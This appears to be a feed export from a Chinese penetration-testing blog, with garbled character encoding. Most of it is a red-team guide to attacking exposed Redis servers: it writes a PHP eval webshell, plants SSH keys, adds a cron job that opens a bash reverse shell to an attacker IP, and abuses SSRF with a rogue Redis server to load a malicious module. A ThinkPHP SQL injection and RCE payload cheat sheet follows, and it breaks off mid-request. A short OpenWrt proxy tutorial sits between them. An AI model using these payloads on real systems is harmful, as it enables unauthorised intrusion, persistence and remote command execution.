    <content type="html"><![CDATA[<h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><p>redis ç»‘å®šç«¯å£ 6379ï¼Œä¸”ä»»æ„IPèƒ½è®¿é—®ï¼Œæ— å¯†ç ç›´æ¥ç™»å½• redisï¼Œç™»å½•éœ€è¦åœ¨æœ¬åœ°å®‰è£…redis</p><p>æœ¬åœ°å®‰è£… redis</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br><span class="line">tar xzvf redis-2.8.17.tar.gz </span><br><span class="line"><span class="built_in">cd</span> redis-2.8.17</span><br><span class="line">make</span><br><span class="line"><span class="built_in">cd</span> src</span><br><span class="line">cp redis-server /usr/bin/</span><br><span class="line">cp redis-cli /usr/bin/</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">cp redis.conf /etc/</span><br><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure><p>æµ‹è¯•æœªæˆæƒè®¿é—®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h ç›®æ ‡IP -p 6379</span><br></pre></td></tr></table></figure><h2 id="redis-å†™å…¥-webshell"><a href="#redis-å†™å…¥-webshell" class="headerlink" title="redis å†™å…¥ webshell"></a>redis å†™å…¥ webshell</h2><p>åˆ©ç”¨æ¡ä»¶</p><p>å­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´ï¼Œå¹¶ç™»å½•redisï¼Œéœ€è¦çŸ¥é“ web æœåŠ¡å™¨ç›®å½•ï¼Œå¹¶æœ‰å¢åˆ æ”¹æŸ¥çš„æƒé™</p><blockquote><p>webæœåŠ¡å™¨ç›®å½•ï¼Œéœ€è¦è‡ªå·±æ ¹æ®è·å–è·¯å¾„æ›´æ”¹</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h ç›®æ ‡IP -p 6379</span><br><span class="line">config <span class="built_in">set</span> dir /var/www/html/         <span class="comment"># webæœåŠ¡å™¨ç›®å½•ï¼Œæ›¿æ¢</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\r\n\r\n&lt;?php eval(<span class="variable">$_POST</span>[whoami]);?&gt;\r\n\r\n&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><h2 id="redis-å†™å…¥-SSH"><a href="#redis-å†™å…¥-SSH" class="headerlink" title="redis å†™å…¥ SSH"></a>redis å†™å…¥ SSH</h2><p>åˆ©ç”¨æ¡ä»¶</p><p>å­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´ï¼Œå¹¶ç™»å½•redisï¼Œ.sshç›®å½•æœ‰å†™å…¥çš„æƒé™</p><p>åŸç†</p><p>åŸç†å°±æ˜¯åœ¨æ•°æ®åº“ä¸­æ’å…¥ä¸€æ¡æ•°æ®ï¼Œå°†æœ¬æœºçš„å…¬é’¥ä½œä¸ºvalueï¼Œkeyå€¼éšæ„ï¼Œç„¶åé€šè¿‡ä¿®æ”¹æ•°æ®åº“çš„é»˜è®¤è·¯å¾„ä¸º/root/.sshå’Œé»˜è®¤çš„ç¼“å†²æ–‡ä»¶authorized.keysï¼ŒæŠŠç¼“å†²çš„æ•°æ®ä¿å­˜åœ¨æ–‡ä»¶é‡Œï¼Œè¿™æ ·å°±å¯ä»¥åœ¨æœåŠ¡å™¨ç«¯çš„/root/.sshä¸‹ç”Ÿæˆä¸€ä¸ªæˆæƒçš„keyã€‚</p><p>æ”»å‡»æœº</p><p>ç”Ÿæˆ SSH å¯†é’¥ï¼Œå¯¼å…¥key.txtï¼Œå†æŠŠkey.txtå†™å…¥redis æœåŠ¡å™¨ä¸­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat /root/.ssh/id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; /root/.ssh/key.txt</span><br><span class="line">cat /root/.ssh/key.txt | redis-cli -h ç›®æ ‡IP -x <span class="built_in">set</span> xxx</span><br></pre></td></tr></table></figure><p>ç™»å½• redis å†™å…¥sshï¼Œæ–‡ä»¶åä¸º auth_keys</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h ç›®æ ‡IP</span><br><span class="line">config <span class="built_in">set</span> dir /root/.ssh</span><br><span class="line">config <span class="built_in">set</span> dbfilename auth_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ç™»å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh ç›®æ ‡IP</span><br></pre></td></tr></table></figure><h2 id="redis-å†™å…¥è®¡åˆ’ä»»åŠ¡-è·å–shell"><a href="#redis-å†™å…¥è®¡åˆ’ä»»åŠ¡-è·å–shell" class="headerlink" title="redis å†™å…¥è®¡åˆ’ä»»åŠ¡ è·å–shell"></a>redis å†™å…¥è®¡åˆ’ä»»åŠ¡ è·å–shell</h2><p>æ•°æ®åº“ä¸­æ’å…¥ä¸€æ¡æ•°æ®ï¼Œå°†è®¡åˆ’ä»»åŠ¡çš„å†…å®¹ä½œä¸ºvalueï¼Œkeyå€¼éšæ„ï¼Œç„¶åé€šè¿‡ä¿®æ”¹æ•°æ®åº“çš„é»˜è®¤è·¯å¾„ä¸ºç›®æ ‡ä¸»æœºè®¡åˆ’ä»»åŠ¡çš„è·¯å¾„ï¼ŒæŠŠç¼“å†²çš„æ•°æ®ä¿å­˜åœ¨æ–‡ä»¶é‡Œï¼Œè¿™æ ·å°±å¯ä»¥åœ¨æœåŠ¡å™¨ç«¯æˆåŠŸå†™å…¥ä¸€ä¸ªè®¡åˆ’ä»»åŠ¡è¿›è¡Œåå¼¹shell</p><p>æ”»å‡»æœºä¸Šç›‘å¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 5555</span><br></pre></td></tr></table></figure><p>ç™»å½•ç›®æ ‡ç½‘ç«™</p><blockquote><p>æ ¹æ®ä¸åŒç±»å‹çš„Linuxéœ€è¦æ›´æ”¹è·¯å¾„<br>Centosçš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶åœ¨</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/</span><br></pre></td></tr></table></figure><blockquote><p>Ubuntuå®šæ—¶ä»»åŠ¡æ–‡ä»¶åœ¨</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/crontabs/</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h ç›®æ ‡IP</span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/æ”»å‡»æœºIP/5555 0&gt;&amp;1\n\n&quot;</span></span><br><span class="line">config <span class="built_in">set</span> dir /var/spool/cron/crontabs/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>ç¨ç­‰ç‰‡åˆ»ï¼Œå³å¯åå¼¹</p><h2 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h2><ul><li><p>  å¯†ç éªŒè¯</p></li><li><p>  é™æƒè¿â¾</p></li><li><p>  é™åˆ¶ ip / ä¿®æ”¹ç«¯â¼</p></li></ul><p><a href="https://www.runoob.com/redis/redis-install.html" title="https://www.runoob.com/redis/redis-install.html">https://www.runoob.com/redis/redis-install.html</a></p><h2 id="SSRFåˆ©ç”¨Redis-å†™shell"><a href="#SSRFåˆ©ç”¨Redis-å†™shell" class="headerlink" title="SSRFåˆ©ç”¨Redis å†™shell"></a>SSRFåˆ©ç”¨Redis å†™shell</h2><p>ä¸ä¸€å®šæ˜¯ssrf ä¹Ÿå¯ä»¥æ˜¯ spring ä¹‹ç±»çš„ï¼Œåªè¦èƒ½è·å–åˆ°redisè´¦å·å¯†ç å°±è¡Œã€‚</p><h3 id="SSRF-è·å–çœŸå®IP"><a href="#SSRF-è·å–çœŸå®IP" class="headerlink" title="SSRF è·å–çœŸå®IP"></a>SSRF è·å–çœŸå®IP</h3><p>vps ç›‘å¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp <span class="number">1234</span></span><br></pre></td></tr></table></figure><p>ssrf æ¼æ´åˆ©ç”¨ç‚¹è¯·æ±‚æœåŠ¡å™¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1234</span></span><br></pre></td></tr></table></figure><p>å»æœåŠ¡å™¨ä¸Šçœ‹å¯ä»¥çœ‹åˆ°çœŸå®IP</p><p>åˆ©ç”¨dictæ¢æµ‹redis</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="built_in">dict</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span></span><br></pre></td></tr></table></figure><p>å‘ç°å¼€æ”¾ redis æœåŠ¡</p><p>è·å–ç½‘ç«™ç»å¯¹è·¯å¾„å¦‚æœæ˜¯ å¯ä»¥æ ¹æ®ç½‘ç«™ç‰¹æ€§è·å–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/www/wwwroot/hx4_triangle/application</span><br></pre></td></tr></table></figure><h3 id="redis-åˆ©ç”¨ä¸»ä»å¤åˆ¶çº¯å‡€æ–‡ä»¶"><a href="#redis-åˆ©ç”¨ä¸»ä»å¤åˆ¶çº¯å‡€æ–‡ä»¶" class="headerlink" title="redis åˆ©ç”¨ä¸»ä»å¤åˆ¶çº¯å‡€æ–‡ä»¶"></a>redis åˆ©ç”¨ä¸»ä»å¤åˆ¶çº¯å‡€æ–‡ä»¶</h3><p><img src="/2022/1972078239/image_QN7QV4HYNQ.png"></p><h3 id="redisæœåŠ¡å™¨å†™å…¥shell"><a href="#redisæœåŠ¡å™¨å†™å…¥shell" class="headerlink" title="redisæœåŠ¡å™¨å†™å…¥shell"></a>redisæœåŠ¡å™¨å†™å…¥shell</h3><p>ä¸»æœåŠ¡å™¨æ­å»º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install epel-release</span><br><span class="line">sudo yum -y install redis</span><br><span class="line">sudo systemctl start redis</span><br><span class="line"></span><br><span class="line">vi /etc/redis.conf</span><br><span class="line"><span class="comment">#ä¿®æ”¹é…ç½®æ–‡ä»¶ redis.conf</span></span><br><span class="line">bind <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å°†redisé»˜è®¤çš„å®ˆæŠ¤å…³é—­</span></span><br><span class="line">protected-mode yes ä¿®æ”¹ä¸º </span><br><span class="line">protected-mode no</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sudo systemctl restart redis</span><br><span class="line">systemctl stop firewalld </span><br></pre></td></tr></table></figure><p>å†™shell</p><p>æœ¬åœ°redis å†™å…¥&#x20;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line"><span class="built_in">set</span> phpshell <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flushall æ¸…ç©ºkeys*</span></span><br><span class="line"><span class="comment"># å†™shellçš„ phpshellä¸ºåå­—</span></span><br></pre></td></tr></table></figure><p>ssrfç›®æ ‡æœåŠ¡å™¨å†™å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">config:<span class="built_in">set</span>:<span class="built_in">dir</span>:/www/wwwroot/runtime/</span><br><span class="line">config:<span class="built_in">set</span>:dbfilename <span class="number">1.</span>php</span><br><span class="line">slaveof:<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>:<span class="number">6379</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æŒ‡å®šè·¯å¾„</span></span><br><span class="line"><span class="comment">#ä¿®æ”¹æ–‡ä»¶å</span></span><br><span class="line"><span class="comment">#è¿æ¥æœåŠ¡å™¨</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>èšå‰‘è¿æ¥</p><h3 id="ä½¿ç”¨redisåˆ©ç”¨å·¥å…·"><a href="#ä½¿ç”¨redisåˆ©ç”¨å·¥å…·" class="headerlink" title="ä½¿ç”¨redisåˆ©ç”¨å·¥å…·"></a>ä½¿ç”¨redisåˆ©ç”¨å·¥å…·</h3><p>vps ä¸‹è½½åˆ©ç”¨å·¥å…·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server.git</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd Awsome-Redis-Rogue-Server/</span><br><span class="line">python3 redis_rogue_server.py -v -path <span class="number">1.</span>php <span class="comment"># 1.php ä¸ºè‡ªå·±å†™çš„é©¬å­</span></span><br></pre></td></tr></table></figure><p>ç”¨dictå†™shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config get <span class="built_in">dir</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/lib/redis</span><br><span class="line">config <span class="built_in">set</span> dbfilename test.php</span><br></pre></td></tr></table></figure><h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis_rogue_server.py -v -path module.so</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹å½“å‰redisçš„ç›¸å…³é…ç½®</span></span><br><span class="line">ssrf.php?url=<span class="built_in">dict</span>://<span class="number">172.16</span><span class="number">.186</span><span class="number">.4</span>:<span class="number">6379</span>/info</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®å¤‡ä»½æ–‡ä»¶å</span></span><br><span class="line">ssrf.php?url=<span class="built_in">dict</span>://<span class="number">172.16</span><span class="number">.186</span><span class="number">.4</span>:<span class="number">6379</span>/config:<span class="built_in">set</span>:dbfilename:exp.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿æ¥æ¶æ„RedisæœåŠ¡å™¨</span></span><br><span class="line">ssrf.php?url=<span class="built_in">dict</span>://<span class="number">172.16</span><span class="number">.186</span><span class="number">.4</span>:<span class="number">6379</span>/slaveof:<span class="number">192.168</span><span class="number">.0</span><span class="number">.107</span>:<span class="number">1234</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ è½½æ¶æ„æ¨¡å—</span></span><br><span class="line">ssrf.php?url=<span class="built_in">dict</span>://<span class="number">172.16</span><span class="number">.186</span><span class="number">.4</span>:<span class="number">6379</span>/module:load:./exp.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ‡æ–­ä¸»ä»å¤åˆ¶</span></span><br><span class="line">ssrf.php?url=<span class="built_in">dict</span>://<span class="number">172.16</span><span class="number">.186</span><span class="number">.4</span>:<span class="number">6379</span>/slaveof:no:one</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span></span><br><span class="line"> ssrf.php?url=<span class="built_in">dict</span>://<span class="number">172.16</span><span class="number">.186</span><span class="number">.4</span>:<span class="number">6379</span>/redisruntime.rev:<span class="number">192.168</span><span class="number">.0</span><span class="number">.107</span>:<span class="number">1234</span></span><br></pre></td></tr></table></figure><p><a href="https://juejin.cn/post/6860666710920265741" title="https://juejin.cn/post/6860666710920265741">https://juejin.cn/post/6860666710920265741</a></p><p><a href="https://www.t00ls.cc/articles-56339.html" title="https://www.t00ls.cc/articles-56339.html">https://www.t00ls.cc/articles-56339.html</a></p>]]></content>
    
    
    <summary type="html">redis 6379 æ‰“ç‚¹æ€è·¯</summary>
    
    
    
    <category term="çº¢é˜Ÿæ‰“ç‚¹" scheme="https://fz1lin.com/categories/%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9/"/>
    
    
    <category term="Redis" scheme="https://fz1lin.com/tags/Redis/"/>
    
    <category term="æœªæˆæƒè®¿é—®" scheme="https://fz1lin.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    
  </entry>
  
  <entry>
    <title>N1 è½¯è·¯ç”±åˆ· openwrt</title>
    <link href="https://fz1lin.com/2022/1386849462/"/>
    <id>https://fz1lin.com/2022/1386849462/</id>
    <published>2022-05-15T08:23:53.000Z</published>
    <updated>2022-05-15T08:44:01.659Z</updated>
    
    <content type="html"><![CDATA[<p>è§£å†³é—®é¢˜ï¼š</p><p>ç”¨äºå‡ºå·®éšèº«æºå¸¦ï¼Œå®ç°ç§‘å­¦ä¸Šç½‘ï¼Œæ‰€æœ‰æµé‡èµ°è·¯ç”±å™¨ï¼Œè€Œä¸æ˜¯æœ¬æœºä»£ç†ï¼Œæœ‰äº›æ‰«æå™¨æˆ–è€…è½¯ä»¶ï¼Œæƒé™é«˜ï¼Œä¸èµ°å…¨å±€ä»£ç†ï¼Œå®¹æ˜“æ¼IPï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä»è·¯ç”±ä¸Šè§£å†³ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨openwrtèµ°æ—è·¯ç”±ï¼Œä¸è¿‡æœ¬æ•™ç¨‹åªæ˜¯ä¸­ç»§ï¼Œåç»­å‡ºæ—è·¯ç”±å§ï¼Œæœ¬æ•™ç¨‹ä»…ç”¨äºå®‰å…¨ç ”ç©¶ä»¥æŠ€æœ¯äº¤æµï¼Œé€ æˆçš„åæœä½¿ç”¨è€…è´Ÿè´£ã€‚</p><p>è®¾å¤‡ï¼šæ–è®¯ N1</p><h2 id="N1-åˆ·openwrt-x20"><a href="#N1-åˆ·openwrt-x20" class="headerlink" title="N1 åˆ·openwrt&#x20;"></a>N1 åˆ·openwrt&#x20;</h2><p>å›ºä»¶ï¼š<a href="https://www.aliyundrive.com/s/KhSCHkTZeei" title="https://www.aliyundrive.com/s/KhSCHkTZeei">https://www.aliyundrive.com/s/KhSCHkTZeei</a>   æå–ç : 34ei</p><p>N1åˆ·openwrtæ•™ç¨‹ï¼š<a href="http://readme.jimostudio.link:9000/?id=57" title="http://readme.jimostudio.link:9000/?id=57">http://readme.jimostudio.link:9000/?id=57</a></p><h2 id="æ‹“æ‰‘å›¾"><a href="#æ‹“æ‰‘å›¾" class="headerlink" title="æ‹“æ‰‘å›¾"></a>æ‹“æ‰‘å›¾</h2><p><img src="/2022/1386849462/N1%E6%8B%93%E6%89%91%E5%9B%BE_2lqmA54YCH.png"></p><h2 id="N1-è½¯è·¯ç”±æ— çº¿ä¸­ç»§æ¨¡å¼"><a href="#N1-è½¯è·¯ç”±æ— çº¿ä¸­ç»§æ¨¡å¼" class="headerlink" title="N1 è½¯è·¯ç”±æ— çº¿ä¸­ç»§æ¨¡å¼"></a>N1 è½¯è·¯ç”±æ— çº¿ä¸­ç»§æ¨¡å¼</h2><p>è¿›å…¥åå°</p><p><a href="http://192.168.1.100/cgi-bin/luci/" title="http://192.168.1.100/">http://192.168.1.100/</a></p><p>è´¦å· root å¯†ç password</p><p>æ— çº¿ä¸­ç»§æ¨¡å¼</p><p>ç‚¹å‡»æ‰«æ</p><p><img src="/2022/1386849462/image_U6B37R4C2w.png"></p><p>åŠ å…¥ç½‘ç»œ</p><p><img src="/2022/1386849462/image_C0O29wzD14.png"></p><p>è¾“å…¥å¯†ç -æäº¤</p><p><img src="/2022/1386849462/image_-lLoSzcQzW.png"></p><p>é€‰æ‹©æ¥å£ LAN ä¹Ÿå°±æ˜¯ç½‘çº¿çš„é‚£ä¸ªå£ï¼Œè®¾ç½®DNS è®¿é—®ç™¾åº¦æµ‹è¯•</p><p><img src="/2022/1386849462/image_4xNFMVx9Ky.png"></p><p>æµ‹è¯•æˆåŠŸè¯´æ˜è·¯ç”±èµ°è·¯ç”±å™¨äº†</p><h2 id="ç§‘å­¦ä¸Šç½‘"><a href="#ç§‘å­¦ä¸Šç½‘" class="headerlink" title="ç§‘å­¦ä¸Šç½‘"></a>ç§‘å­¦ä¸Šç½‘</h2><p><img src="/2022/1386849462/image_CNNX3hA7-u.png"></p><p>éœ€è¦è‡ªå·±å‡†å¤‡æœºåœºåˆ—è¡¨</p><p>ç‚¹å‡»æ·»åŠ -å¯ç”¨å‹¾é€‰-å¤‡æ³¨éšä¾¿å¡«-æŠŠè®¢é˜…è¿æ¥æ·»åŠ ä¸Šé¢-ä¿å­˜åº”ç”¨-æ‰‹åŠ¨è®¢é˜…</p><p><img src="/2022/1386849462/image_kI3glymSHL.png"></p><p>ä¸»å¼€å…³å‹¾é€‰ -é€‰æ‹©è‡ªå·±æœºåœºçš„èŠ‚ç‚¹</p><p><img src="/2022/1386849462/image_M4MHkVycxc.png"></p><p>è¿™é‡Œæ ¹æ®è‡ªå·±çš„å–œå¥½ï¼Œæ›´æ”¹ä»£ç†æ¨¡å¼</p><p><img src="/2022/1386849462/image_w7Xsim2z1Z.png"></p><p>è®¿é—® <a href="http://ip111.cn/" title="http://ip111.cn/">http://ip111.cn/</a></p><p><img src="/2022/1386849462/image_AfGPD46ypu.png"></p><h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><p>å¦‚æœæœªç”Ÿæ•ˆé‡å¯ä¸€ä¸‹è·¯ç”±æˆ–è€…ç¦ç”¨å¯ç”¨ä¸€ä¸‹ç½‘å¡</p>]]></content>
    
    
    <summary type="html">å‘Šåˆ«windows èµ°æœ¬åœ°ä»£ç†ï¼Œå®ç°è·¯ç”±å™¨èµ°å…¨å±€ä»£ç†ï¼Œä¸­ç»§æ¨¡å¼ï¼Œå‡ºå·®ä¾¿æº</summary>
    
    
    
    <category term="è½¯è·¯ç”±" scheme="https://fz1lin.com/categories/%E8%BD%AF%E8%B7%AF%E7%94%B1/"/>
    
    
    <category term="N1" scheme="https://fz1lin.com/tags/N1/"/>
    
    <category term="Router" scheme="https://fz1lin.com/tags/Router/"/>
    
    <category term="openwrt" scheme="https://fz1lin.com/tags/openwrt/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP 3.x ï¼Œ5.x æ¼æ´é€ŸæŸ¥</title>
    <link href="https://fz1lin.com/2022/429639226/"/>
    <id>https://fz1lin.com/2022/429639226/</id>
    <published>2022-02-20T08:40:53.000Z</published>
    <updated>2022-02-20T08:56:46.750Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ThinkPHP-ç‰ˆæœ¬æ¢æµ‹"><a href="#ThinkPHP-ç‰ˆæœ¬æ¢æµ‹" class="headerlink" title="ThinkPHP ç‰ˆæœ¬æ¢æµ‹"></a>ThinkPHP ç‰ˆæœ¬æ¢æµ‹</h2><p>ä½¿ç”¨æµè§ˆå™¨æ’ä»¶åˆ¤æ–­æ˜¯ ThinkPHP </p><p><img src="/2022/429639226/image-20220218132319732.png" alt="image-20220218132319732"> </p><p>æäº¤ä»»æ„å­—ç¬¦ï¼Œä¼šçˆ†å‡ºæ¡†æ¶ç‰ˆæœ¬</p><p> <img src="/2022/429639226/image-20220218134539894.png" alt="image-20220218134539894"> </p><p>å¦‚æœç‰ˆæœ¬éšè—ï¼Œå¯ä»¥è€ƒè™‘ç›²æ‰“ã€‚ä½¿ç”¨payloadå³å¯ï¼Œä½œä¸ºæ‰“ç‚¹æ¼æ´ï¼Œéœ€è¦çŸ¥é“ï¼Œè¯¥æ¼æ´æ˜¯å¦æœ‰åˆ©ç”¨é¢ï¼Œä¹Ÿå°±æ˜¯è¿›ä¸€æ­¥çš„æ·±å…¥ï¼Œèƒ½å¦è·å–å†…ç½‘è·å–æƒé™ã€‚</p><h2 id="ThinkPHP-3-2-3-æ¼æ´"><a href="#ThinkPHP-3-2-3-æ¼æ´" class="headerlink" title="ThinkPHP 3.2.3 æ¼æ´"></a>ThinkPHP 3.2.3 æ¼æ´</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//u</span>rl<span class="regexp">/ThinkPHP/</span>POC</span><br></pre></td></tr></table></figure><p>order by æ³¨å…¥æ¼æ´</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">order</span>[updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,<span class="keyword">user</span>()),<span class="number">1</span>)]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>update æ³¨å…¥æ¼æ´</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">money</span>[]=<span class="number">1123</span>&amp;user=liao&amp;id[<span class="number">0</span>]=bind&amp;id[<span class="number">1</span>]=<span class="number">0</span>%<span class="number">20</span>and%<span class="number">20</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x<span class="number">7</span>e,(select%<span class="number">20</span>user()),<span class="number">0</span>x<span class="number">7</span>e),<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h3 id="3-2-x-RCE-æ¼æ´"><a href="#3-2-x-RCE-æ¼æ´" class="headerlink" title="3.2.x  RCE æ¼æ´"></a>3.2.x  RCE æ¼æ´</h3><p>å…³é—­ debug</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /index.php?m=--&gt;&lt;?=phpinfo();?&gt; HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">127.0.0.1</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Macintosh; Intel Mac OS X <span class="number">10</span>_<span class="number">15</span>_<span class="number">6</span>) AppleWebKit/<span class="number">605</span>.<span class="number">1</span>.<span class="number">15</span> (KHTML, like Gecko) Version/<span class="number">13</span>.<span class="number">1</span>.<span class="number">2</span> Safari/<span class="number">605</span>.<span class="number">1</span>.<span class="number">15</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/webp,*/*;q=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">Accept</span>-Language: en-GB,en;q=<span class="number">0</span>.<span class="number">5</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=b<span 